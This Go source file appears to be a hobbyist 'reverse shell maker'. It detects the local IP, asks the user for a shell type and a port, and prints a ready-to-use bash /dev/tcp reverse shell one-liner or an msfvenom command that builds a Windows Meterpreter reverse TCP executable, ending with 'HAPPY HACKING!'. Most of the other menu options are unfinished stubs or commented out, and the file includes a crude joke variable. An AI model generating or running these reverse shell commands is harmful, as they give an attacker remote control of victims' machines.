//I wanted to create a little reverse shell maker
//playing a little with the "fmt" package
//have fun reading my code lel
package main

import (
	"fmt"
	"log"
	"net"
)

/*func lstOfRevShells() {
const bashS = done
const phpS =
const javaS =
const perlS =
const pythonS =
const rubyS =
const ncS =
}*/

//@formatter:off

var denis =     "penis" // i am the ugly formatter from GOland and now i am off
						// because of this sweet comments

//@formatter:on

// Get preferred outbound ip of this machine
func supply() net.IP {
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		log.Fatal(err)
	}
	defer conn.Close()
	localAddr := conn.LocalAddr().(*net.UDPAddr)
	fmt.Println(localAddr.IP)
	//get local ip part is over and the lexical part begins
	const intMessage = "Hello user, let us create so reverse shells! What we going to choose today?"
	const listOfShells = "1. Bash Reverse Shell.\n2. Windows Meterpreter Staged Reverse TCP (x64).\n" +
		"Java Reverse Shell.\n" +
		"Perl Reverse Shell.\nPython Reverse Shell.\nRuby Reverse Shell.\nNetcat Reverse Shell."
	fmt.Println(intMessage, "\n"+listOfShells)
	fmt.Println("So what shell we going to take?\nJust choose the right number:")
	// var then variable name then variable type
	var choosenS string
	// Taking input from user
	fmt.Scanln(&choosenS)
	fmt.Println("What Port we going to use?\nJust type the number or name:")
	var choosenP string
	fmt.Scanln(&choosenP)
	//two friends dan and lens = together the autoanswer
	var dan = "you took"
	var lens = "shell\nHere is your shell, just copy it, HAPPY HACKING!"
	fmt.Println(dan, choosenS, lens)
	var ipa = localAddr.IP
	switch choosenS {
	case "1", "Bash Reverse Shell", "Bash", "bash":
		fmt.Print("sh -i >& /dev/tcp/", ipa, "/", choosenP, " 0>&1\n")
	case "2", "Windows Meterpreter Staged Reverse TCP (x64)":
		fmt.Print("msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=", ipa,
			" LPORT=", choosenP, " -f exe -o reverse.exe\n")
	}

	return localAddr.IP
}

func a() {
	/*switch choosenS {
	case "1", "Bash Reverse Shell", "Bash", "Reverse", "reverse":
		fmt.Print("sh -i >& /dev/tcp/", ipa, "/9001 0>&1\n")

	}*/

}

func main() {

	supply()

}
